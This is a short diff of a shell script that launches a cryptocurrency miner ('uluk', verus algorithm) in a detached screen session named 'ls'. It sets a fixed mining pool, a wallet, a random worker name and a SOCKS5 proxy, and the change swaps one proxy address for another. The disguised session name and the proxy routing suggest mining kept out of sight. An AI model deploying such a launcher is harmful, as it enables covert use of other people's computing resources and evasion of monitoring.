@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RYBb7hyLUnBd7XRtre7jjjvVfYRWoAdors
 WORKER=$(echo $(shuf -i 1-10 -n 1)BEH)
-PROXY=socks5://181.3.14.202:1080
+PROXY=socks5://184.181.217.210:4145
 ./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
